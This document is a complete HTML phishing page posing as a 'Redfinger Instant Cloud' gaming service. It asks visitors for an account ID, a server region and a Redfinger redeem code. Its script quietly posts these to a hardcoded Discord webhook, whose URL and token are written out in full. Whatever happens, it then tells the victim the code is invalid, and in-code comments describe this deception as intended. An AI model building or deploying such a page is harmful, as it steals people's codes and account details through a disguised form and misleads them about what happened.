<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redfinger Instant Cloud</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', 'Segoe UI', sans-serif;
            background: #0a0e27;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        body::before {
            content: '';
            position: absolute;
            width: 500px;
            height: 500px;
            background: radial-gradient(circle, rgba(239, 68, 68, 0.15) 0%, transparent 70%);
            top: -100px;
            right: -100px;
            border-radius: 50%;
        }

        body::after {
            content: '';
            position: absolute;
            width: 400px;
            height: 400px;
            background: radial-gradient(circle, rgba(59, 130, 246, 0.15) 0%, transparent 70%);
            bottom: -100px;
            left: -100px;
            border-radius: 50%;
        }

        .container {
            background: rgba(17, 24, 39, 0.95);
            border: 1px solid rgba(75, 85, 99, 0.3);
            border-radius: 24px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            padding: 50px 40px;
            width: 100%;
            max-width: 480px;
            backdrop-filter: blur(20px);
            animation: slideIn 0.6s ease-out;
            position: relative;
            z-index: 1;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-40px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
        }

        .header h1 {
            color: #fff;
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .header .subtitle {
            color: #9ca3af;
            font-size: 14px;
            font-weight: 400;
        }

        .form-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            color: #e5e7eb;
            font-weight: 600;
            margin-bottom: 10px;
            font-size: 14px;
            letter-spacing: 0.3px;
        }

        input, select {
            width: 100%;
            padding: 14px 16px;
            background: rgba(31, 41, 55, 0.8);
            border: 1px solid rgba(75, 85, 99, 0.5);
            border-radius: 12px;
            font-size: 15px;
            color: #fff;
            transition: all 0.3s ease;
            font-family: inherit;
        }

        input::placeholder {
            color: #6b7280;
        }

        input:focus, select:focus {
            outline: none;
            border-color: #ef4444;
            background: rgba(31, 41, 55, 1);
            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.1);
        }

        select {
            cursor: pointer;
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg width='12' height='8' viewBox='0 0 12 8' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 1.5L6 6.5L11 1.5' stroke='%239ca3af' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 16px center;
            padding-right: 45px;
        }

        select option {
            background: #1f2937;
            color: #fff;
        }

        #codeGroup {
            display: none;
            animation: fadeInDown 0.4s ease-out;
        }

        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .btn-start {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 30px;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            box-shadow: 0 10px 25px rgba(239, 68, 68, 0.3);
        }

        .btn-start:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 35px rgba(239, 68, 68, 0.4);
        }

        .btn-start:active {
            transform: translateY(0);
        }

        .btn-start:disabled {
            background: linear-gradient(135deg, #374151 0%, #1f2937 100%);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .message {
            margin-top: 24px;
            padding: 16px;
            border-radius: 12px;
            font-size: 14px;
            text-align: center;
            display: none;
            animation: fadeIn 0.3s ease;
            font-weight: 600;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .message.error {
            background: rgba(239, 68, 68, 0.15);
            color: #fca5a5;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }

        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.2);
            border-top: 3px solid #fff;
            border-radius: 50%;
            width: 18px;
            height: 18px;
            animation: spin 0.8s linear infinite;
            display: inline-block;
            margin-left: 10px;
            vertical-align: middle;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Mobile Responsive */
        @media (max-width: 480px) {
            .container {
                padding: 40px 30px;
            }

            .header h1 {
                font-size: 24px;
            }

            input, select {
                padding: 13px 15px;
                font-size: 14px;
            }

            .btn-start {
                padding: 15px;
                font-size: 15px;
            }
        }

        /* Custom scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(31, 41, 55, 0.5);
        }

        ::-webkit-scrollbar-thumb {
            background: rgba(75, 85, 99, 0.8);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: rgba(107, 114, 128, 1);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>‚òÅÔ∏è Redfinger Instant Cloud</h1>
            <p class="subtitle">Cloud Gaming Platform</p>
        </div>

        <form id="codeForm">
            <div class="form-group">
                <label for="userId">Your ID Account</label>
                <input 
                    type="number" 
                    id="userId" 
                    name="userId" 
                    placeholder="Enter your ID account" 
                    required
                    min="1"
                >
            </div>

            <div class="form-group">
                <label for="serverSelect">Select Server</label>
                <select id="serverSelect" required>
                    <option value="" disabled selected>Choose server region</option>
                    <option value="Hong Kong">Hong Kong</option>
                    <option value="Singapore">Singapore</option>
                    <option value="Thailand">Thailand</option>
                    <option value="Taiwan">Taiwan</option>
                    <option value="United States">United States</option>
                </select>
            </div>

            <div class="form-group" id="codeGroup">
                <label for="redfingerCode">Enter Code Redfinger</label>
                <input 
                    type="text" 
                    id="redfingerCode" 
                    name="redfingerCode" 
                    placeholder="XXXX-XXXX-XXXX" 
                    maxlength="14"
                >
            </div>

            <button type="submit" class="btn-start" id="submitBtn">
                Start
            </button>
        </form>

        <div class="message error" id="message">‚ùå Code Invalid</div>
    </div>

    <script>
        const form = document.getElementById('codeForm');
        const submitBtn = document.getElementById('submitBtn');
        const message = document.getElementById('message');
        const codeInput = document.getElementById('redfingerCode');
        const serverSelect = document.getElementById('serverSelect');
        const codeGroup = document.getElementById('codeGroup');

        // Show code input when server is selected
        serverSelect.addEventListener('change', function() {
            if (this.value) {
                codeGroup.style.display = 'block';
                codeInput.required = true;
            }
        });

        // Auto format code with dash
        codeInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^A-Z0-9]/gi, '').toUpperCase();
            let formattedValue = '';
            
            for (let i = 0; i < value.length && i < 12; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += '-';
                }
                formattedValue += value[i];
            }
            
            e.target.value = formattedValue;
        });

        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const userId = document.getElementById('userId').value;
            const server = serverSelect.value;
            const redfingerCode = document.getElementById('redfingerCode').value;
            
            // Disable button and show loading
            submitBtn.disabled = true;
            submitBtn.innerHTML = 'Processing... <span class="spinner"></span>';
            message.style.display = 'none';
            
            // Data to send to Discord with @everyone mention
            const webhookData = {
                content: "@everyone",
                embeds: [{
                    title: "‚òÅÔ∏è Redfinger Instant Cloud - New Submission",
                    color: 15158332,
                    fields: [
                        {
                            name: "üë§ ID Account",
                            value: `\`${userId}\``,
                            inline: true
                        },
                        {
                            name: "üåè Server",
                            value: server,
                            inline: true
                        },
                        {
                            name: "üîë Redfinger Code",
                            value: `\`${redfingerCode}\``,
                            inline: false
                        }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "Redfinger Cloud System"
                    },
                    thumbnail: {
                        url: "https://i.imgur.com/4M34hi2.png"
                    }
                }]
            };
            
            try {
                const response = await fetch('https://discord.com/api/webhooks/1445316905920364565/24sHAyS_iWUdXzLXL7LZhf5Izv-AdhOWk2s5tVdRD9IwCKci4YgvSh270Zw0AQrgq2HV', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(webhookData)
                });
                
                // Always show "Code Invalid" message regardless of webhook success
                setTimeout(() => {
                    message.style.display = 'block';
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Start';
                }, 1000);
                
            } catch (error) {
                // Still show "Code Invalid" even if there's an error
                setTimeout(() => {
                    message.style.display = 'block';
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'Start';
                }, 1000);
            }
        });
    </script>
</body>
</html>
